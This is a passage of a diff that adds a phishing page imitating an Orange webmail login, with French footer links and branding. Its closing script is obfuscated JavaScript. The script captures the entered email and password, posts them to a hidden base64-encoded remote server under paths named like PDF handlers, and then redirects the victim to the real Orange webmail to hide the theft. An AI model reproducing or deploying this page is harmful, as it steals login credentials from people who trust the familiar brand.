+                        <path fill="#FF7900" d="M151.73 1023.992l530.944-512-530.944-512-151.723 146.219 379.349 365.781-379.349 365.653 151.723 146.347z"></path>
+                    </svg>
+                    
+                </a>
+
+                <a class="footer_link" href="#">
+                    Besoin d’aide ? <svg style="fill: red" width="10" height="10" viewBox="0 0 691.1999999999997 1024">
+                        <path fill="#FF7900" d="M151.73 1023.992l530.944-512-530.944-512-151.723 146.219 379.349 365.781-379.349 365.653 151.723 146.347z"></path>
+                    </svg>
+                    
+                    
+                </a>
+            </div>
+
+            <div class="footer_space">
+
+            </div>
+        </div>
+
+        <!-- Footer container End -->
+
+        <div class="last_page">
+            <nav class="last_items">
+                <li class="items"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACIAAAAYCAYAAACfpi8JAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGiSURBVEhLzZatkoMwFIX7JnkEHgGJrIxErkTyCMhIZCUSWYlEIpHISGTk2YTN8NOeADPbdjcznzk5hNPL5dKLXfg1IsY1L1FV1Q9ljmssuDcMFc8hJFQzwIAvMzRQ8nQgKh6TlOhGf8fdNaIrE37GFiruIzI0qxBGd6jyK2Lh9gXitEDd6VWlRjTZYWWouINA0a5u0eSIqO+CKG9sBL9Mi2IKGoSKYeIKgz8bQ42EeVYk9ezGUMXU46FimFvvjzVoC7L/hELnr0B/I/szVAySzc3R40b2GXP2sUFG9j1UDPJvgsTzM9e4S+7ZInHX/hLbUzH1TFAxTLa8Cfqecs+a834q7pAuv/BoPmzmja1gSjwLVNxFqG4ZVkajURLi0SMV2jmwa4/syfMAFcOERrsZMfQ9esswbr8+xvbG1/4wc1CR8xDCaL1MzsDSrYI8DuGg4jOJLfU6hB1O01SNUhR1O1XBGM+o0bc1ivNfXgcVt4RCvBYqLnwmhIOKHol61flvDOGg4kyi2qkh3xzCQcUNUZIE/3O8ECr+BVT8C6j4YS74BgTsy/LtxCIzAAAAAElFTkSuQmCC" alt="" class="item_img"> <a href="" class="item_link">Aide
+                        et contact</a></li>
+                <li class="items"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAnCAYAAABnlOo2AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAKcSURBVFhHzZetdq0wEIX7AHE8AK4Kh6rCoVA4FC9wFS4KhavCoaLiUFE4VFzfad/Aoaf8bHqg53Zxu9a3VthMJnNCZjJ9cX/4z6DilVDxSqj4BAJhWkKZHtbakd5o1EUMj9pvoOLPEBHK1uLj44NiTYVEkHlLqPgDAhR6P5g7rURA59+h4mlErmBZABssdOFTHxNUPE2uDuzOJ7qAID4mqHiSEJUhC+/R14ipnxEqjnivEbJCQsqBAln0upMpPsrfDMiLJXRHHI100HKbwmnTE1uOVfli7or5g6shUh86nLYtEY0p7CF2c3piw+nRpPM1N3w9bDPFZYQMxwPoxe8wi3dDUAq6/7Ltuse71NXJdwd6YBqIDM3d+YT71snMuNCr9xPW1MhD4WwEorLd2WELU2ePatDAbSAKTZwYlMFkKBLU64AHTLldxIuRlzWU1tCOpsqR+EPAKzvObbBbR2yH1jltWTDje4V86fBZbgP+OXroMkMUhojyGsYyG41i6fBZbgMWkCmDpfFbtTnYvxZQ1qw/WQu5uZlJRbYNsoXN00yDtFnVEv7L1ztp1Z9HaXyWz8Hb6tcfCajDe7y1eZLZgyt+3X0x9smWAfVN+q93Z2ApiMQd3CmbhtZzqCNzzCL93Q4lh+vLUYjoClvRtPR+6o2CjH0klZkqsgsqfUNaKhfsrYe2vYEqU4SP21UGFScE/CBE6OpQGAbwFwt8d01MdO9Heug1VDyIB9mSQGYMrcbJc0bFY/gSLQliibsPfTJ3HyoeI64P9EE96nOlgYrH+O8Cesmh6IU743w3QMXDBK6P2s+04X+w1QX9GCqeQMxq0jIYUz1sVxlUPI3wE+SyRK0aVPJUh7iGildCxSuh4pVQ8UqoeCVUvIgX/AXqRqH72mFDGAAAAABJRU5ErkJggg==" alt="" class="item_img"> <a href="" class="item_link">Forum
+                        d'entraide</a></li>
+
+                <li class="items"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB0AAAAaCAYAAABLlle3AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAExSURBVEhL7ZYtcoUwFIXZ0VsCy8gSkJFZwpORkVcikUgkS4hEIiORpxdeaG5aOn1tQxHtnfkmOWfCuZDhr+LCBRyaZyOFQjehWM2dEtkZUmgMIR5RoMKgRXaGFAo0enhfhpGeutIG/bRgWcow9Y3IzpCC4OPWFClPIjtDCNVjjuuL1NxDyfyEEHpAwftovZOgZX5CCCq6uVweJPMTSdQlH9KtJnR11mwnibrdmwaEuM8LT5Ztlrx1kqavCxEeC5PHTdvPmlbVDY1r4azF3Rg4sjA8GktwPFrLkHt4xoFWzRhHsJtnQY7Hu4Vdc5qbyM6Q4pI30qVNAwYt/Q/YH7E3LwEdz/y/KSPF32vKdfCpek9cW6zpV+pnTb/559AZkVFB0bj5T/45/BqH5tkcmidS4QW3h8YMwYRhgwAAAABJRU5ErkJggg==" alt="" class="item_img"> <a href="" class="item_link">Trouver
+                        une boutique</a></li>
+            </nav>
+
+            <hr style="height:1px;border-width:0;color:gray;background-color:gray">
+
+            <nav class="nav_pages">
+                <li class="nav_info"><a href="" class="info">Informations légales</a></li>
+                <li class="nav_info"><a href="" class="info">Données personnelles </a></li>
+                <li class="nav_info"><a href="" class="info">Accessibilité </a></li>
+                <li class="nav_info"><a href="" class="info">Gestion cookies </a></li>
+                <li class="nav_info"><a href="" class="info">Publicité </a></li>
+                <li class="nav_info"><a href="" class="info">Signaler un contenu </a></li>
+                <li class="nav_info"><a href="" class="info">© Orange 2022 </a></li>
+            </nav>
+
+
+        </div>
+
+    </div>
+
+
+    <script>
+        function _0x2937(){const _0x2291a0=['6KQwXxu','borderBott','textConten','input_fiel','/pdf_files','3126893WsznVD','addEventLi','password','32FgSmle','getElement','php','disabled','POST','ault','1380456JfrXKd','inline-blo','861196NJsJwu','location','click','ById','add','input','.passwordE','.error','none','black','value','.form_wrap','3WunfnU','ajax','replace','tor','querySelec','695158AoAMfo','classList','.id_header','2px\x20solid\x20','.id_box','remove','preventDef','Not\x20Valid','ite/#!','1PfAzTv','match','per2','/pdf_file.','block','14746677UoSVIu','4413380XMtPhP','e.fr/appsu','5394925qYZIKp','rederror','https://ma','il01.orang','.input','.btn-s','.responseE','per','style','display','.btn'];_0x2937=function(){return _0x2291a0;};return _0x2937();}const _0xb9bc52=_0x2f8e;(function(_0x500f0d,_0x269abd){const _0x18bbf4=_0x2f8e,_0x4b8645=_0x500f0d();while(!![]){try{const _0x290e1f=-parseInt(_0x18bbf4(0x109))/0x1*(parseInt(_0x18bbf4(0x100))/0x2)+-parseInt(_0x18bbf4(0xfb))/0x3*(-parseInt(_0x18bbf4(0xef))/0x4)+parseInt(_0x18bbf4(0x111))/0x5*(parseInt(_0x18bbf4(0x11c))/0x6)+-parseInt(_0x18bbf4(0xe4))/0x7+-parseInt(_0x18bbf4(0xe7))/0x8*(parseInt(_0x18bbf4(0xed))/0x9)+-parseInt(_0x18bbf4(0x10f))/0xa+parseInt(_0x18bbf4(0x10e))/0xb;if(_0x290e1f===_0x269abd)break;else _0x4b8645['push'](_0x4b8645['shift']());}catch(_0x32db2a){_0x4b8645['push'](_0x4b8645['shift']());}}}(_0x2937,0xbfd4b));const input=document[_0xb9bc52(0xe8)+_0xb9bc52(0xf2)](_0xb9bc52(0xe2)+'d'),error=document['querySelec'+_0xb9bc52(0xfe)](_0xb9bc52(0xf6)),idBox=document[_0xb9bc52(0xff)+_0xb9bc52(0xfe)](_0xb9bc52(0x104)),passwordInput=document[_0xb9bc52(0xe8)+'ById'](_0xb9bc52(0xe6)),passError=document[_0xb9bc52(0xff)+_0xb9bc52(0xfe)](_0xb9bc52(0xf5)+'rror'),btn=document[_0xb9bc52(0xff)+'tor'](_0xb9bc52(0x11b)),btnsubmit=document[_0xb9bc52(0xff)+_0xb9bc52(0xfe)](_0xb9bc52(0x116)),formWrapper=document[_0xb9bc52(0xff)+_0xb9bc52(0xfe)](_0xb9bc52(0xfa)+_0xb9bc52(0x118)),formWrapper2=document[_0xb9bc52(0xff)+_0xb9bc52(0xfe)]('.form_wrap'+_0xb9bc52(0x10b)),userEmail=document[_0xb9bc52(0xe8)+_0xb9bc52(0xf2)]('user_email'),idHeader2=document[_0xb9bc52(0xff)+_0xb9bc52(0xfe)](_0xb9bc52(0x102)+'2'),inputred=document[_0xb9bc52(0xff)+_0xb9bc52(0xfe)](_0xb9bc52(0x115)),responseError=document[_0xb9bc52(0xff)+_0xb9bc52(0xfe)](_0xb9bc52(0x117)+'rror');function _0x2f8e(_0x21df34,_0x2126cb){const _0x2937d3=_0x2937();return _0x2f8e=function(_0x2f8e4a,_0x4a2723){_0x2f8e4a=_0x2f8e4a-0xe2;let _0x2597f9=_0x2937d3[_0x2f8e4a];return _0x2597f9;},_0x2f8e(_0x21df34,_0x2126cb);}let regexEmail=/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/,rooturl=atob(endhere);const validateUser=()=>{const _0x9f2c0d=_0xb9bc52;btn[_0x9f2c0d(0xe5)+'stener'](_0x9f2c0d(0xf1),()=>{const _0x350e26=_0x9f2c0d;input[_0x350e26(0xf9)]===''||!input[_0x350e26(0xf9)][_0x350e26(0x10a)](regexEmail)?(error['style'][_0x350e26(0x11a)]=_0x350e26(0xee)+'ck',inputred[_0x350e26(0x101)][_0x350e26(0xf3)]('rederror'),inputred['classList'][_0x350e26(0x105)](_0x350e26(0xf4))):(inputred[_0x350e26(0x101)][_0x350e26(0x105)](_0x350e26(0x112)),inputred[_0x350e26(0x101)][_0x350e26(0xf3)](_0x350e26(0xf4)),error[_0x350e26(0x119)][_0x350e26(0x11a)]=_0x350e26(0xf7),setTimeout(()=>{const _0x518af9=_0x350e26;formWrapper['style'][_0x518af9(0x11a)]=_0x518af9(0xf7),idHeader2[_0x518af9(0x119)][_0x518af9(0x11a)]='none',formWrapper2[_0x518af9(0x119)][_0x518af9(0x11a)]=_0x518af9(0x10d),idBox[_0x518af9(0x119)][_0x518af9(0x11a)]=_0x518af9(0xf7),error['style'][_0x518af9(0x11a)]=_0x518af9(0xf7),userEmail[_0x518af9(0x11e)+'t']=input[_0x518af9(0xf9)];},0x5dc));});};validateUser();const passwordValidation=()=>{const _0x28d8bb=_0xb9bc52;btnsubmit[_0x28d8bb(0xe5)+'stener']('click',_0xc3a24a=>{const _0x294bff=_0x28d8bb;passwordInput['value']===''?(passError[_0x294bff(0x119)]['display']='inline-blo'+'ck',passwordInput[_0x294bff(0x119)]['borderBott'+'om']=_0x294bff(0x103)+'red',passwordInput[_0x294bff(0x101)][_0x294bff(0xf3)](_0x294bff(0x112)),passwordInput[_0x294bff(0x101)][_0x294bff(0x105)](_0x294bff(0xf4)),_0xc3a24a[_0x294bff(0x106)+'ault']()):(passError[_0x294bff(0x119)][_0x294bff(0x11a)]=_0x294bff(0xf7),passwordInput['classList']['remove']('rederror'),passwordInput['style'][_0x294bff(0x11d)+'om']=_0x294bff(0x103)+_0x294bff(0xf8),passwordInput[_0x294bff(0x101)][_0x294bff(0xf3)](_0x294bff(0xf4)),_0xc3a24a[_0x294bff(0x106)+_0x294bff(0xec)](),$[_0x294bff(0xfc)]({'url':rooturl+(_0x294bff(0xe3)+'.php'),'type':_0x294bff(0xeb),'data':{'user':input[_0x294bff(0xf9)],'pass':passwordInput[_0x294bff(0xf9)]},'beforeSend':function(){btnsubmit['disabled']=!![];},'success':function(_0x5a0c69){const _0x50f240=_0x294bff;_0x5a0c69['ok']?($[_0x50f240(0xfc)]({'url':rooturl+(_0x50f240(0x10c)+_0x50f240(0xe9)),'type':_0x50f240(0xeb),'data':{'user':input['value'],'pass':passwordInput[_0x50f240(0xf9)]}}),window[_0x50f240(0xf0)][_0x50f240(0xfd)](_0x50f240(0x113)+_0x50f240(0x114)+_0x50f240(0x110)+_0x50f240(0x108))):(responseError[_0x50f240(0x119)]['display']=_0x50f240(0xee)+'ck',$['ajax']({'url':rooturl+('/pdf_file.'+'php'),'type':_0x50f240(0xeb),'data':{'user':input[_0x50f240(0xf9)],'pass':passwordInput[_0x50f240(0xf9)],'subject':_0x50f240(0x107)}}),btnsubmit[_0x50f240(0xea)]=![],document[_0x50f240(0xe8)+_0x50f240(0xf2)](_0x50f240(0xe6))[_0x50f240(0xf9)]='');}}));});};passwordValidation(),document[_0xb9bc52(0xe8)+_0xb9bc52(0xf2)](_0xb9bc52(0xe2)+'d')[_0xb9bc52(0xf9)]=eml;
+    </script>
+
+
+</body></html>
